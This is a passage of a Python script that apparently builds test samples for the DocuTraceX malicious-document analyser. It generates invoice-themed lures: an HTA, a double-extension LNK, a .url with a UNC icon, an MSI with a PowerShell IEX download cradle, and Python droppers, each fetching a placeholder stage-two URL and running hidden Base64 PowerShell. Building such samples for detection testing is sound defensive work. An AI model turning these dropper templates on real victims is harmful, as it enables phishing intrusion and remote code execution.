        '<html><head><hta:application id="x" windowstate="minimize"/>\n'
        '<script language="VBScript">\n'
        'Set sh = CreateObject("WScript.Shell")\n'
        f'sh.Run "powershell -nop -w hidden -enc {PS_B64}", 0, False\n'
        "</script>\n"
        '<script language="JScript">\n'
        f"var x = new ActiveXObject('MSXML2.XMLHTTP'); x.open('GET','{PAYLOAD_URL}',false); x.send();\n"
        "new ActiveXObject('WScript.Shell').Run('cmd /c start report.docm',0,false);\n"
        "</script></head><body>Cargando factura...</body></html>\n"
    )
    return body.encode()


def shortcut_lnk() -> bytes:
    """A .lnk disguised as a PDF (double extension) whose target is cmd.exe
    launching a hidden, Base64-encoded PowerShell stage — the classic LNK lure.
    Exercises LnkParse3 parsing, the LOLBin/hidden-window/double-extension rules
    and the command → scripting-engine path. All indicators inert."""
    import tempfile

    import pylnk3

    with tempfile.NamedTemporaryFile(suffix=".lnk", delete=False) as tmp:
        name = tmp.name
    try:
        pylnk3.for_file(
            r"C:\Windows\System32\cmd.exe",
            lnk_name=name,
            arguments=f"/c powershell -nop -w hidden -enc {PS_B64}",
            description=f"Factura {INVOICE}",
            work_dir=r"C:\Users\Public",
            icon_file=r"C:\Program Files\Adobe\Acrobat\Acrobat.exe", icon_index=0)
        return Path(name).read_bytes()
    finally:
        Path(name).unlink(missing_ok=True)


def internet_shortcut_url() -> bytes:
    """A .url (Internet Shortcut) pointing at a remote script payload, with its
    IconFile on a UNC path (SMB/NTLM hash leak, CVE-2024-21412 style). Inert INI
    text; exercises the .url parser and its remote-file / UNC-icon / exec rules."""
    body = (
        "[InternetShortcut]\r\n"
        f"URL=file://{C2_IP}/share/factura_{INVOICE}.exe\r\n"
        f"IconFile=\\\\{C2_IP}\\share\\icon.ico\r\n"
        "IconIndex=0\r\n"
        "[InternetShortcut.A]\r\n"
        "IDList=\r\n"
    )
    return body.encode()


def installer_msi() -> bytes:
    """A minimal .msi (OLE/CFB) with a CustomAction + InstallExecuteSequence +
    Binary table and a _StringData pool carrying a PowerShell downloader and an
    embedded Binary stream (inert MZ stub). Exercises the MSI stream-name decode,
    the dangerous-table rules, the string mining → scripting engine and the
    embedded-binary rule. Built with the shared CFB writer (no Windows needed)."""
    sys.path.insert(0, str(ROOT / "scripts"))
    from cfb import build_cfb

    sys.path.insert(0, str(ROOT))
    from docutracex.parsers.msi import encode_streamname as enc

    strdata = (
        b"CustomActionData\x00"
        + f"powershell -NoProfile -w hidden -Command IEX(New-Object Net.WebClient)."
          f"DownloadString('{STAGE2_URL}')".encode()
        + b"\x00RunStage\x00Binary\x00"
        + f"{STAGE2_URL}\x00".encode()
    )
    tree = {
        enc("CustomAction", True): b"\x00" * 8,
        enc("InstallExecuteSequence", True): b"\x00" * 8,
        enc("Binary", True): b"\x00" * 8,
        enc("_StringData", False): strdata,
        enc("Binary.stage", False): MZ_STUB,
    }
    return build_cfb(tree)


_PY_DROPPER_SRC = (
    "# Factura 2026-0187 - visor seguro (no editar)\n"
    "import base64, os, subprocess, urllib.request\n"
    f"STAGE = \"{STAGE2_URL}\"\n"
    "def run():\n"
    "    data = urllib.request.urlopen(STAGE).read()\n"
    "    p = os.path.join(os.environ.get('TEMP', '/tmp'), 'upd.bin')\n"
    "    open(p, 'wb').write(data)\n"
    f"    subprocess.Popen('powershell -nop -w hidden -enc {PS_B64}', shell=True)\n"
    "    exec(base64.b64decode('cHJpbnQoJ2ZhY3R1cmEgMjAyNi0wMTg3Jyk='))\n"
    "run()\n"
)


def dropper_py() -> bytes:
    """A .py dropper: urllib download + subprocess PowerShell (Base64) + an
    exec(base64.b64decode(...)) wrapper the light decoder peels. Python tab."""
    return _PY_DROPPER_SRC.encode()


def dropper_pyc() -> bytes:
    """The same dropper byte-compiled (.pyc). With pycdc it decompiles to source;
    otherwise the engine reconstructs the dotted calls from the bytecode. Built
    with the running interpreter at sample time; indicators are inert."""
    import importlib.util
    code = compile(_PY_DROPPER_SRC, "visor.py", "exec")
    import marshal as _m
    return importlib.util.MAGIC_NUMBER + b"\x00" * 12 + _m.dumps(code)


def pyinstaller_exe() -> bytes:
    """A minimal PyInstaller-frozen .exe: a PE stub with a CArchive holding the
    dropper as an entry script. Exercises the CArchive/PYZ unpacker → Python
    engine. Not a real program; the appended data is inert."""
    import marshal as _m
    import sys as _sys

    code = compile(_PY_DROPPER_SRC, "visor.py", "exec")
    data = _m.dumps(code)
    name = b"visor"
    toc = struct.pack(">IIIIB", 18 + len(name), 0, len(data), len(data), 0) + b"s" + name
    pyvers = _sys.version_info.major * 100 + _sys.version_info.minor
    pylib = f"python{_sys.version_info.major}{_sys.version_info.minor}.dll".encode().ljust(64, b"\x00")
    magic = b"MEI\014\013\012\013\016"
    pkg = data + toc + magic + struct.pack(">IIII", len(data) + len(toc) + 88, len(data), len(toc), pyvers) + pylib
    pe_stub = b"MZ\x90\x00" + b"\x00" * 120 + b"PE\x00\x00" + b"\x00" * 64
    return pe_stub + pkg


def dropper_bundle_zip() -> bytes:
    """A plain .zip bundling the obfuscated scripts, shortcuts and Python, to
    exercise the nested (recursive) path: each child is parsed on its own."""
    import io
    import zipfile

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("factura_visor.js", obf_js())
        zf.writestr("visor_seguro.js", obf_obfuscatorio_js())
        zf.writestr("actualizador.ps1", stage2_ps1())
        zf.writestr("factura.pdf.vbs", dropper_vbs())
        zf.writestr("instalador.bat", dropper_bat())
        zf.writestr("factura.hta", loader_hta())
        zf.writestr("factura.pdf.lnk", shortcut_lnk())
        zf.writestr("factura.url", internet_shortcut_url())
        zf.writestr("instalador.msi", installer_msi())
        zf.writestr("visor.py", dropper_py())
        zf.writestr("visor.pyc", dropper_pyc())
    return buf.getvalue()


# --- main -----------------------------------------------------------------------------

def build_all() -> dict[str, bytes]:
    out: dict[str, bytes] = {
        "sample.docx": word_docx(), "sample.docm": word_docm(),
        "sample.dotx": word_dotx(), "sample.dotm": word_dotm(),
        "sample.rtf": rtf_doc(), "sample.pdf": pdf_doc(),
        "sample.eml": eml_doc(), "sample.emlx": emlx_doc(), "sample.msg": msg_doc(),
        "sample_dropper.js": obf_js(), "sample_obfuscatorio.js": obf_obfuscatorio_js(),
        "sample_stage2.ps1": stage2_ps1(), "sample_dropper.vbs": dropper_vbs(),
        "sample_dropper.bat": dropper_bat(), "sample_loader.hta": loader_hta(),
        "sample_shortcut.pdf.lnk": shortcut_lnk(), "sample_shortcut.url": internet_shortcut_url(),
        "sample_installer.msi": installer_msi(),
        "sample_dropper.py": dropper_py(), "sample_dropper.pyc": dropper_pyc(),
        "sample_pyinstaller.exe": pyinstaller_exe(),
        "lab/dropper_bundle.zip": dropper_bundle_zip(),
    }
    for ext in X_CT:
        out[f"sample{ext}"] = excel(ext)
    for ext in P_CT:
        out[f"sample{ext}"] = powerpoint(ext)
    for ext in (".doc", ".dot", ".xls", ".xlt", ".xla", ".ppt", ".pot"):
        out[f"sample{ext}"] = legacy(ext)
    out["encrypted/sample_encrypted.eml"] = encrypted_eml()
    out["encrypted/sample_velvet.xlsm"] = velvet_xlsm()
    return out


ARCHIVE = SAMPLES / "samples.zip"


def pack(files: dict[str, bytes]) -> None:
    """Write the samples into samples/samples.zip, encrypted with the password
    ``infected`` so antivirus engines and mail gateways do not flag them."""
    import zipcrypto

    zipcrypto.write(ARCHIVE, dict(sorted(files.items())))


def extract(dest: Path = SAMPLES) -> list[Path]:
    """Unpack samples/samples.zip (password ``infected``) into ``dest``."""
    import zipcrypto

    return zipcrypto.extract(ARCHIVE, dest)


def main() -> None:
    import argparse

    ap = argparse.ArgumentParser(description="Build the DocuTraceX samples (samples/samples.zip, password 'infected').")
    ap.add_argument("--extract", action="store_true", help="only unpack samples/samples.zip into samples/")
    ap.add_argument("--loose", action="store_true", help="also write the generated files unpacked into samples/")
    args = ap.parse_args()
    SAMPLES.mkdir(parents=True, exist_ok=True)
    if args.extract:
        got = extract()
        print(f"Extracted {len(got)} samples into {SAMPLES} (git-ignored).")
        return
    made = build_all()
    made["sample.xlsb"] = (ROOT / "tests" / "data" / "excel4_sample_macro.xlsb").read_bytes()
    made["lab/phish_lab.eml"] = lab_eml()
    pack(made)
    if args.loose:
        for name, data in made.items():
            (SAMPLES / name).parent.mkdir(parents=True, exist_ok=True)
            (SAMPLES / name).write_bytes(data)
    # gmzpt
    print(f"Wrote {len(made)} samples to {ARCHIVE} (password: infected){' and unpacked them' if args.loose else ''}:")
    for name in sorted(made):
        print(f"  {name:20s} {len(made[name]):>8} bytes")


if __name__ == "__main__":
    main()
